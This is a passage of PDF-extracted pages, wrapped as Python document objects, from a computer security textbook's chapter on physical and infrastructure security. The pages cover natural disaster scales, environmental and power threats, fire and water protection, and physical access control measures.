unencrypted on the laptop” from “theft of personal information, and its subse-\\nquent use in identity theft caused by the theft of the laptop,” as discussed in Problem \\n14.6. From the list shown in Table 15.3, select some suitable specific controls that could \\nreduce this risk. Indicate which you believe would be most cost effective.\\n 15.6 Consider the risks you determined in the assessment of a small e-commerce firm, as \\ndiscussed in Problem 14.7 . From the list shown in Table 15.3, select what you believe \\nare the most critical risks, and suggest some suitable specific controls that could reduce \\nthese risks. Indicate which you believe would be most cost effective.\\nM15_STAL0611_04_GE_C15.indd   528 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 530, 'page_label': '529'}, page_content='529\\n16.1 Overview\\n16.2 Physical Security Threats\\nNatural Disasters\\nEnvironmental Threats\\nTechnical Threats\\nHuman-Caused Physical Threats\\n16.3 Physical Security Prevention and Mitigation Measures\\nEnvironmental Threats\\nTechnical Threats\\nHuman-Caused Physical Threats\\n16.4 Recovery from Physical Security Breaches\\n16.5 Example: A Corporate Physical Security Policy\\n16.6 Integration of Physical and Logical Security\\nPersonal Identity Verification\\nUse of PIV Credentials in Physical Access Control Systems\\n16.7 Key Terms, Review Questions, and Problems\\nPhysical and Infrastructure \\nSecurity\\nCHAPTER \\n \\nM16_STAL0611_04_GE_C16.indd   529 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 531, 'page_label': '530'}, page_content='530  CHAPTER 16 / PHySICAl And InfRASTRuCTuRE SECuRITy\\n[PLAT14] distinguishes three elements of information system (IS) security:\\n• Logical security:  Protects computer-based data from software-based and \\n communication-based threats. The bulk of this book deals with logical security.\\n• Physical security: Also called infrastructure security. Protects the information \\nsystems that contain data and the people who use, operate, and maintain the \\nsystems. Physical security also must prevent any type of physical access or intru-\\nsion that can compromise logical security.\\n• Premises security: Also known as corporate or facilities security. Protects the \\npeople and property within an entire area, facility, or building(s), and is usually \\nrequired by laws, regulations, and fiduciary obligations. Premises security provides \\nperimeter security, access control, smoke and fire detection, fire suppression, some \\nenvironmental protection, and usually surveillance systems, alarms, and guards.\\nThis chapter is concerned with physical security and with some overlapping \\nareas of premises security. We survey a number of threats to physical security and a \\nnumber of approaches to prevention, mitigation, and recovery. To implement a physi-\\ncal security program, an organization must conduct a risk assessment to determine \\nthe amount of resources to devote to physical security and the allocation of those \\nresources against the various threats. This process also applies to logical security. This \\nassessment and planning process is covered in Chapters 14 and 15.\\n 16.1 OVERVIEW\\nFor information systems, the role of physical security is to protect the physical assets \\nthat support the storage and processing of information. Physical security involves \\ntwo complementary requirements. First, physical security must prevent damage to \\nthe physical infrastructure that sustains the information system. In broad terms, that \\ninfrastructure includes the following:\\n• Information system hardware:  Includes data processing and storage equip -\\nment, transmission and networking facilities, and offline storage media. We can \\ninclude in this category supporting documentation.\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Provide an overview of various types of physical security threats.\\n ◆ Assess the value of various physical security prevention and mitigation \\nmeasures.\\n ◆ Discuss measures for recovery from physical security breaches.\\n ◆ Understand the role of the personal identity verification (PIV) standard in \\nphysical security.\\n ◆ Explain the use of PIV mechanisms as part of a physical access control \\nsystem.\\nM16_STAL0611_04_GE_C16.indd   530 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 532, 'page_label': '531'}, page_content='16.2 / PHySICAl SECuRITy THREATS  531\\n• Physical facility:  The buildings and other structures housing the system and \\nnetwork components.\\n• Supporting facilities: These facilities underpin the operation of the information \\nsystem. This category includes electrical power, communication services, and \\nenvironmental controls (heat, humidity, etc.).\\n• Personnel: Humans involved in the control, maintenance, and use of the infor-\\nmation systems.\\nSecond, physical security must prevent misuse of the physical infrastructure \\nthat leads to the misuse or damage of the protected information. The misuse of the \\nphysical infrastructure can be accidental or malicious. It includes vandalism, theft of \\nequipment, theft by copying, theft of services, and unauthorized entry.\\n 16.2 PHYSICAL SECURITY THREATS\\nIn this section, we look at the types of physical situations and occurrences that can \\nconstitute a threat to information systems. There are a number of ways in which such \\nthreats can be categorized. It is important to understand the spectrum of threats to \\ninformation systems so responsible administrators can ensure that prevention mea-\\nsures are comprehensive. We organize the threats into the following categories:\\n• Environmental threats\\n• Technical threats\\n• Human-caused threats\\nWe begin with a discussion of natural disasters, which are a prime, but not the only, \\nsource of environmental threats. Then we will look specifically at environmental \\nthreats, followed by technical and human-caused threats.\\nNatural Disasters\\nNatural disasters are the source of a wide range of environmental threats to data \\ncenters, other information processing facilities, and their personnel. It is possible to \\nassess the risk of various types of natural disasters and take suitable precautions so \\ncatastrophic loss from natural disaster is prevented.\\nTable 16.1 lists six categories of natural disasters, the typical warning time for \\neach event, whether or not personnel evacuation is indicated or possible, and the \\ntypical duration of each event. We comment briefly on the potential consequences \\nof each type of disaster.\\nA tornado can generate winds that exceed hurricane strength in a narrow band \\nalong the tornado’s path. There is substantial potential for structural damage, roof \\ndamage, and loss of outside equipment. There may be damage from wind and flying \\ndebris. Off site, a tornado may cause a temporary loss of local utility and communica-\\ntions. Off-site damage is typically followed by quick restoration of services. Tornado \\ndamage severity is measured by the Fujita Tornado Scale (see Table 16.2).\\nHurricanes, tropical storms, and typhoons, collectively known as tropical \\ncyclones, are among the most devastating naturally occurring hazards. Depending on \\nM16_STAL0611_04_GE_C16.indd   531 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 533, 'page_label': '532'}, page_content='532  CHAPTER 16 / PHySICAl And InfRASTRuCTuRE SECuRITy\\nCategory Wind Speed Range Description of Damage\\nF0 40–72 mph\\n64–116 km/hr\\nLight damage. Some damage to chimneys; tree branches broken off; \\nshallow-rooted trees pushed over; sign boards damaged.\\nF1 73–112 mph\\n117–180 km/hr\\nModerate damage. The lower limit is the beginning of hurricane \\nwind speed; roof surfaces peeled off; mobile homes pushed off \\n foundations or overturned; moving autos pushed off the roads.\\nF2 113–157 mph\\n181–252 km/hr\\nConsiderable damage. Roofs torn off houses; mobile homes \\n demolished; boxcars pushed over; large trees snapped or uprooted; \\nlight-object missiles generated.\\nF3 158–206 mph\\n253–332 km/hr\\nSevere damage. Roofs and some walls torn off well-constructed \\nhouses; trains overturned; most trees in forest uprooted; heavy cars \\nlifted off ground and thrown.\\nF4 207–260 mph\\n333–418 km/hr\\nDevastating damage. Well-constructed houses leveled; structures \\nwith weak foundation blown off some distance; cars thrown and \\nlarge missiles generated.\\nF5 261–318 mph\\n419–512 km/hr\\nIncredible damage. Strong frame houses lifted off foundations and \\ncarried considerable distance to disintegrate; automobile-sized \\n missiles fly through the air in excess of 100 yards; trees debarked.\\nTable 16.2 Fujita Tornado Intensity Scale\\nWarning Evacuation Duration\\nTornado Advance warning of  \\npotential; not site specific\\nRemain at site Brief but intense\\nHurricane Significant advance warning May require evacuation Hours to a few days\\nEarthquake No warning May be unable to  \\nevacuate\\nBrief duration; threat of \\n continued aftershocks\\nIce Storm/\\nBlizzard\\nSeveral days warning  \\ngenerally expected\\nMay be unable to evacuate May last several days\\nLightning Sensors may provide  \\nminutes of warning\\nMay require evacuation Brief but may recur\\nFlood Several days warning  \\ngenerally expected\\nMay be unable to evacuate Site may be isolated for \\nextended period\\nSource: ComputerSite Engineering, Inc.\\nTable 16.1 Characteristics of Natural Disasters\\nstrength, cyclones may also cause significant structural damage and damage to outside \\nequipment at a particular site. Off site, there is the potential for severe regionwide \\ndamage to public infrastructure, utilities, and communications. If on-site operation \\nmust continue, then emergency supplies for personnel as well as a backup genera -\\ntor are needed. Further, the responsible site manager may need to mobilize private \\npoststorm security measures, such as armed guards.\\nTable 16.3 summarizes the widely used Saffir/Simpson Hurricane Scale. In \\n general, damage rises by about a factor of four for every category increase [PIEL08].\\nM16_STAL0611_04_GE_C16.indd   532 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 534, 'page_label': '533'}, page_content='16.2 / PHySICAl SECuRITy THREATS  533\\nA major earthquake  has the potential for the greatest damage and occurs \\nwithout warning. A facility near the epicenter may suffer catastrophic or even \\ncomplete destruction, with significant and long-lasting damage to data centers and \\nother IS facilities. Examples of inside damage include the toppling of unbraced \\ncomputer hardware and site infrastructure equipment, including the collapse of \\nraised floors. Personnel are at risk from broken glass and other flying debris. Off \\nsite, near the epicenter of a major earthquake, the damage equals and often exceeds \\nthat of a major hurricane. Structures that can withstand a hurricane, such as roads \\nand bridges, may be damaged or destroyed, preventing the movement of fuel and \\nother supplies.\\nAn ice storm or blizzard can cause some disruption of or damage to IS facilities \\nif outside equipment and the building are not designed to survive severe ice and snow \\naccumulation. Off site, there may be widespread disruption of utilities and commu-\\nnications and roads may be dangerous or impassable.\\nThe consequences of lightning strikes can range from no impact to disaster. The \\neffects depend on the proximity of the strike and the efficacy of grounding and surge \\nprotection measures in place. Off site, there can be disruption of electrical power and \\nthere is the potential for fires.\\nFlood is a concern in areas that are subject to flooding and for facilities that are \\nin severe flood areas at low elevation. Damage can be severe, with long-lasting effects \\nand the need for a major cleanup operation.\\nEnvironmental Threats\\nThis category encompasses conditions in the environment that can damage or interrupt \\nthe service of information systems and the data they contain. Off site, there may be \\nsevere regionwide damage to the public infrastructure and, in the case of severe events \\nsuch as hurricanes, it may take days, weeks, or even years to recover from the event.\\nInapproprIate temperature and HumIdIty Computers and related equipment \\nare designed to operate within a certain temperature range. Most computer systems \\nshould be kept between 10°C and 32°C (50°F and 90°F). Outside this range, resources \\nCategory\\nWind Speed \\nRange Storm Surge\\nPotential  \\nDamage\\n1 74–95 mph\\n119–153 km/hr\\n4–5 ft\\n1–2 m\\nMinimal\\n2 96–110 mph\\n154–177 km/hr\\n6–8 ft\\n2–3 m\\nModerate\\n3 111–130 mph\\n178–209 km/hr\\n9–12 ft\\n3–4 m\\nExtensive\\n4 131–155 mph\\n210–249 km/hr\\n13–18 ft\\n-5 m\\nExtreme\\n5 7155 mph\\n7249 km/hr\\n718 ft\\n75 m\\nCatastrophic\\nTable 16.3 Saffir/Simpson Hurricane Scale\\nM16_STAL0611_04_GE_C16.indd   533 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 535, 'page_label': '534'}, page_content='534  CHAPTER 16 / PHySICAl And InfRASTRuCTuRE SECuRITy\\nmight continue to operate but produce undesirable results. If the ambient tempera-\\nture around a computer gets too high, the computer cannot adequately cool itself, and \\ninternal components can be damaged. If the  temperature gets too cold, the system \\ncan undergo thermal shock when it is turned on, causing circuit boards or integrated \\ncircuits to crack. Table 16.4 indicates the point at which permanent damage from \\nexcessive heat begins.\\nAnother concern is the internal temperature of equipment, which can be \\n significantly higher than room temper ature. Computer-related equipment comes \\nwith its own temperature dissipation and cooling mechanisms, but these may \\nrely on, or be affected by, external conditions. Such conditions include excessive \\n ambient  temperature, interruption of supply of power or heating, ventilation, and  \\nair-conditioning (HVAC) services, and vent blockage.\\nHigh humidity also poses a threat to electrical and electronic equipment. \\n Long-term exposure to high humidity can r esult in corrosion. Condensation can \\nthreaten magnetic and optical storage media. Condensation can also cause a short \\ncircuit, which in turn can damage circuit boards. High humidity can also cause a \\n galvanic effect that results in electroplating, in which metal from one connector \\nslowly migrates to the mating connector, bonding the two together.\\nVery low humidity can also be a concern. Under prolonged conditions of low \\nhumidity, some materials may change shape, and performance may be affected. \\nStatic electricity also becomes a concern. A person or object that becomes statically \\ncharged can damage electronic equipment by an electric discharge. Static electricity \\ndischarges as low as 10 volts can damage particularly sensitive electronic circuits, \\nand discharges in the hundreds of volts can create significant damage to a variety of \\nelectronic circuits. Discharges from humans can reach into the thousands of volts, so \\nthis is a nontrivial threat.\\nIn general, relative humidity should be maintained between 40% and 60% to \\navoid the threats from both low and high humidity.\\nFIre and Smoke Perhaps the most frightening physical threat is fire. It is a threat \\nto human life and pr operty. The threat is not only from direct flame, but also from \\nheat, release of toxic fumes, water damage from fire suppression, and smoke damage. \\nFurther, fire can disrupt utilities, especially electricity.\\nComponent or Medium\\nSustained Ambient Temperature  \\nat which Damage may Begin\\nFlexible disks, magnetic tapes, etc. 38°C (100°F)\\nOptical media 49°C (120°F)\\nHard disk media 66°C (150°F)\\nComputer equipment 79°C (175°F)\\nThermoplastic insulation on wires \\ncarrying hazardous voltage\\n125°C (257°F)\\nPaper products 177°C (350°F)\\nSource: Data taken from National Fire Protection Association.\\nTable 16.4 Temperature Thresholds for Damage to Computing Resources\\nM16_STAL0611_04_GE_C16.indd   534 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 536, 'page_label': '535'}, page_content='16.2 / PHySICAl SECuRITy THREATS  535\\nThe temperature due to fire increases with time, and in a typical building, fire \\neffects follow the curve shown in Figure 16.1. To get a sense of the damage caused \\nby fire, Tables 16.4 and 16.5 shows the temperature at which various items melt or \\nare damaged and therefore indicates how long after the fire is started such damage \\noccurs.\\nSmoke damage related to fires can also be extensive. Smoke is an abrasive. \\nIt\\xa0collects on the heads of unsealed magnetic disks, optical disks, and tape drives. \\nElectrical fires can produce an acrid smoke that may damage other equipment and \\nmay be poisonous or carcinogenic.\\nThe most common fire threat is from fires that originate within a facility, and, \\nas discussed subsequently, there are a number of preventive and mitigating measures \\nthat can be taken. A more uncontrollable threat is faced from wildfires, which are a \\nplausible concern in the western United States, portions of Australia (where the term \\nbushfire is used), and a number of other countries.\\nWater damage Water and other stored liquids in proximity to computer equip -\\nment pose an ob vious threat. The primary danger is an electrical short, which can \\nFigure 16.1 Standard Fire Temperature–Time Relations Used for Testing of \\nBuilding Elements\\n500\\n400\\n0 1 2 3 4\\nDuration, hours\\nFire Temperature, ºC\\nFire Temperature, ºF \\n5 6 7 8 \\n800\\n900\\n1000\\n1100\\n1200\\n1300\\n1400\\n1500\\n1600\\n1700\\n1800\\n1900\\n2000\\n2100\\n2200\\n2300\\n600\\n700\\n800\\n900\\n1000\\n1100\\n1200\\n1300\\nM16_STAL0611_04_GE_C16.indd   535 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 537, 'page_label': '536'}, page_content='536  CHAPTER 16 / PHySICAl And InfRASTRuCTuRE SECuRITy\\nhappen if water bridges between a circuit board trace carrying voltage and a trace \\ncarrying ground. Moving water, such as in plumbing, and weather-created water from \\nrain, snow, and ice also pose threats. A pipe may burst from a fault in the line or \\nfrom freezing. Sprinkler systems, despite their security function, are a major threat \\nto computer equipment and paper and electronic storage media. The system may \\nbe set off by a faulty temperature sensor, or a burst pipe may cause water to enter \\nthe computer room. In any large computer installation, due diligence should be per-\\nformed to ensure that water from as far as two floors above will not create a hazard. \\nAn overflowing toilet is an example of such a hazard.\\nLess common, but more catastrophic, is floodwater. Much of the damage comes \\nfrom the suspended material in the water. Floodwater leaves a muddy residue that is \\nextraordinarily difficult to clean up.\\nCHemICal, radIologICal, and BIologICal HazardS Chemical, radiological, \\nand biological hazards pose a growing threat, both from intentional attack and from \\naccidental discharge. None of these hazardous agents should be present in an infor-\\nmation system environment, but either accidental or intentional intrusion is possible. \\nNearby discharges (e.g., from an overturned truck carrying hazardous materials) can \\nbe introduced through the ventilation system or open windows and, in the case of \\nradiation, through perimeter walls. In addition, discharges in the vicinity can disrupt \\nwork by causing evacuations to be ordered. Flooding can also introduce biological \\nor chemical contaminants.\\nIn general, the primary risk of these hazards is to personnel. Radiation and \\nchemical agents can also cause damage to electronic equipment.\\nduSt Dust is a prevalent concern that is often overlooked. Even fibers from \\nfabric and paper ar e abrasive and mildly conductive, although generally equip -\\nment is resistant to such contaminants. Larger influxes of dust can result from a \\nnumber of incidents, such as a controlled explosion of a nearby building and a \\nwindstorm carrying debris from a wildfire. A more likely source of influx comes \\nfrom dust surges that originate within the building due to construction or main -\\ntenance work.\\nEquipment with moving parts, such as rotating storage media and computer \\nfans, are the most vulnerable to damage from dust. Dust can also block ventilation \\nand reduce radiational cooling.\\nTemperature Effect\\n260°C/ 500°F Wood ignites\\n326°C/ 618°F Lead melts\\n415°C/ 770°F Zinc melts\\n480°C/ 896°F An uninsulated steel file tends to buckle and expose its contents\\n625°C/ 1157°F Aluminum melts\\n1220°C/ 2228°F Cast iron melts\\n1410°C/ 2570°F Hard steel melts\\nTable 16.5 Temperature Effects\\nM16_STAL0611_04_GE_C16.indd   536 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 538, 'page_label': '537'}, page_content='16.2 / PHySICAl SECuRITy THREATS  537\\nInFeStatIon One of the less pleasant physical threats is infestation, which covers a \\nbroad range of living organisms, including mold, insects, and rodents. High-humidity \\nconditions can lead to the growth of mold and mildew, which can be harmful to both \\npersonnel and equipment. Insects, particularly those that attack wood and paper, are \\nalso a common threat.\\nTechnical Threats\\nThis category encompasses threats related to electrical power and electromagnetic \\nemission.\\neleCtrICal poWer Electrical power is essential to the operation of an informa -\\ntion system. All of the electrical and electronic devices in the system require power, \\nand most require uninterrupted utility power. Power utility problems can be broadly \\ngrouped into three categories: undervoltage, overvoltage, and noise.\\nAn undervoltage condition occurs when the IS equipment receives less voltage \\nthan is required for normal operation. Undervoltage events range from temporary \\ndips in the voltage supply, to brownouts (prolonged undervoltage), to power outages. \\nMost computers are designed to withstand prolonged voltage reductions of about \\n20% without shutting down and without operational error. Deeper dips or black -\\nouts lasting more than a few milliseconds trigger a system shutdown. Generally, no \\n damage is done, but service is interrupted.\\nFar more serious is an overvoltage condition. A surge of voltage can be caused \\nby a utility company supply anomaly, by some internal (to the building) wiring fault, \\nor by lightning. Damage is a function of intensity and duration, and the effectiveness \\nof any surge protectors between your equipment and the source of the surge. A suffi-\\ncient surge can destroy silicon-based components, including processors and memories.\\nPower lines can also be a conduit for noise. In many cases, these spurious sig-\\nnals can endure through the filtering circuitry of the power supply and interfere with \\nsignals inside electronic devices, causing logical errors.\\neleCtromagnetIC InterFerenCe Noise along a power supply line is only one \\nsource of electromagnetic interference (EMI). Motors, fans, heavy equipment, and \\neven other computers generate electrical noise that can cause intermittent problems \\nwith the computer you are using. This noise can be transmitted through space as well \\nas through nearby power lines.\\nAnother source of EMI is high-intensity emissions from nearby commercial \\nradio stations and microwave relay antennas. Even low-intensity devices, such as \\n cellular telephones, can interfere with sensitive electronic equipment.\\nHuman-Caused Physical Threats\\nHuman-caused threats are more difficult to deal with than the environmental and \\ntechnical threats discussed so far. Human-caused threats are less predictable than \\nother types of physical threats. Worse, human-caused threats are specifically designed \\nto overcome prevention measures and/or seek the most vulnerable point of attack. \\nWe can group such threats into the following categories:\\n• Unauthorized physical access: Those without the proper authorization should \\nnot be allowed access to certain portions of a building or complex unless \\nM16_STAL0611_04_GE_C16.indd   537 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 539, 'page_label': '538'}, page_content='538  CHAPTER 16 / PHySICAl And InfRASTRuCTuRE SECuRITy\\naccompanied with an authorized individual. Information assets such as servers, \\nmainframe computers, network equipment, and storage networks are generally \\nlocated in a restricted area, with access limited to a small number of employees. \\nUnauthorized physical access can lead to other threats, such as theft, vandalism, \\nor misuse.\\n• Theft: This threat includes theft of equipment and theft of data by copying. \\nEavesdropping and wiretapping also fall into this category. Theft can be at the \\nhands of an outsider who has gained unauthorized access or by an insider.\\n• Vandalism: This threat includes destruction of equipment and data.\\n• Misuse: This category includes improper use of resources by those who are \\nauthorized to use them, as well as use of resources by individuals not authorized \\nto use the resources at all.\\n 16.3 PHYSICAL SECURITY PREVENTION AND MITIGATION \\nMEASURES\\nIn this section, we look at a range of techniques for preventing, or in some cases sim-\\nply deterring, physical attacks. We begin with a survey of some of the techniques for \\ndealing with environmental and technical threats and then move on to human-caused \\nthreats. Standards including ISO 27002 ( Code of practice for information security \\nmanagement, 2013) and NIST SP 800-53 (Recommended Security Controls for Federal \\nInformation Systems, January 2015) include lists of controls relating to physical and \\nenvironmental security, as we showed in Tables 15.2 and 15.3.\\nOne general prevention measure is the use of cloud computing. From a physical \\nsecurity viewpoint, an obvious benefit of cloud computing is that there is a reduced \\nneed for information system assets on site and a substantial portion of data assets \\nare not subject to on-site physical threats. See Chapter 13 for a discussion of cloud \\ncomputing security issues.\\nEnvironmental Threats\\nWe discuss these threats in the same order as in Section 16.2.\\nInappropr Iate temperature  and H umIdIty Dealing with this problem is  \\n primarily a matter of having environmental-control equipment of appropriate \\ncapacity and appropriate sensors to warn of thresholds being exceeded. Beyond \\nthat, the principal requirement is the maintenance of a power supply, to be \\n discussed subsequently .\\nFIre and Smoke Dealing with fire in volves a combination of alarms, preventive \\nmeasures, and fire mitigation. [MART73] provides the following list of necessary \\nmeasures:\\n1. Choice of site to minimize likelihood of disaster. Few disastrous fires originate \\nin a well-protected computer room or IS facility. The IS area should be chosen \\nto minimize fire, water, and smoke hazards from adjoining areas. Common walls \\nwith other activities should have at least a one-hour fire-protection rating.\\nM16_STAL0611_04_GE_C16.indd   538 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 540, 'page_label': '539'}, page_content='16.3 / PHySICAl SECuRITy PREVEnTIOn And MITIGATIOn MEASuRES  539\\n2. Air conditioning and other ducts designed so as not to spread fire. There are stan-\\ndard guidelines and specifications for such designs.\\n3. Positioning of equipment to minimize damage.\\n4. Good housekeeping. Records and flammables must not be stored in the IS area. \\nTidy installation of IS equipment is crucial.\\n5. Hand-operated fire extinguishers readily available, clearly marked, and regularly \\ntested.\\n6. Automatic fire extinguishers installed. Installation should be such that the extin-\\nguishers are unlikely to cause damage to equipment or danger to personnel.\\n7. Fire detectors. The detectors sound alarms inside the IS room and with external \\nauthorities, and start automatic fire extinguishers after a delay to permit human \\nintervention.\\n8. Equipment power-off switch. This switch must be clearly marked and unob -\\nstructed. All personnel must be familiar with power-off procedures.\\n9. Emergency procedures posted.\\n10. Personnel safety. Safety must be considered in designing the building layout and \\nemergency procedures.\\n11. Important records stored in fireproof cabinets or vaults.\\n12. Records needed for file reconstruction stored off the premises.\\n13. Up-to-date duplicate of all programs stored off the premises.\\n14. Contingency plan for use of equipment elsewher e should the computers be \\ndestroyed.\\n15. Insurance company and local fire department should inspect the facility.\\nTo deal with the threat of smoke, the responsible manager should install \\nsmoke detectors in every room that contains computer equipment as well as under \\nraised floors and over suspended ceilings. Smoking should not be permitted in \\ncomputer rooms.\\nFor wildfires, the available countermeasures are limited. Fire-resistant building \\ntechniques are costly and difficult to justify.\\nWater damage Prevention and mitigation measures for water threats must \\nencompass the range of such threats. For plumbing leaks, the cost of relocating threat-\\nening lines is generally difficult to justify. With knowledge of the exact layout of water \\nsupply lines, measures can be taken to locate equipment sensibly. The location of all \\nshutoff valves should be clearly visible or at least clearly documented, and responsible \\npersonnel should know the procedures to follow in case of emergency.\\nTo deal with both plumbing leaks and other sources of water, sensors are vital. \\nWater sensors should be located on the floor of computer rooms, as well as under \\nraised floors, and should cut off power automatically in the event of a flood.\\notHer envIronmental  tHreatS For chemical, biological, and radiological \\nthreats, specific technical approaches are available, including infrastructure design, \\nsensor design and placement, mitigation procedures, personnel training, and so forth. \\nStandards and techniques in these areas continue to evolve.\\nM16_STAL0611_04_GE_C16.indd   539 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 541, 'page_label': '540'}, page_content='540  CHAPTER 16 / PHySICAl And InfRASTRuCTuRE SECuRITy\\nAs for dust hazards, the obvious prevention method is to limit dust through \\nproper filter maintenance and regular IS room maintenance.\\nFor infestations, regular pest control procedures may be needed, starting with \\nmaintaining a clean environment.\\nTechnical Threats\\nTo deal with brief power interruptions, an uninterruptible power supply (UPS) should \\nbe employed for each piece of critical equipment. The UPS is a battery backup unit \\nthat can maintain power to processors, monitors, and other equipment for a period \\nof minutes. UPS units can also function as surge protectors, power noise filters, and \\nautomatic shutdown devices when the battery runs low.\\nFor longer blackouts or brownouts, critical equipment should be connected \\nto an emergency power source, such as a generator. For reliable service, a range of \\nissues need to be addressed by management, including product selection, generator \\n placement, personnel training, testing and maintenance schedules, and so forth.\\nTo deal with electromagnetic interference, a combination of filters and shielding \\ncan be used. The specific technical details will depend on the infrastructure design \\nand the anticipated sources and nature of the interference.\\nHuman-Caused Physical Threats\\nThe general approach to human-caused physical threats is physical access control. \\nBased on [MICH06], we can suggest a spectrum of approaches that can be used to \\nrestrict access to equipment. These methods can be used in combination:\\n1. Physical contact with a resource is restricted by restricting access to the \\nbuilding in which the resource is housed. This approach is intended to deny \\naccess to outsiders but does not address the issue of unauthorized insiders or \\nemployees.\\n2. Physical contact with a resource is restricted by putting the resource in a locked \\ncabinet, safe, or room.\\n3. A machine may be accessed, but it is secured (perhaps permanently bolted) to an \\nobject that is difficult to move. This will deter theft but not vandalism, unauthor-\\nized access, or misuse.\\n4. A security device controls the power switch.\\n5. A movable resource is equipped with a tracking device so a sensing portal can \\nalert security personnel or trigger an automated barrier to prevent the object from \\nbeing moved out of its proper security area.\\n6. A portable object is equipped with a tracking device so its current position can \\nbe monitored continually.\\nThe first two of the preceding approaches isolate the equipment. Techniques \\nthat can be used for this type 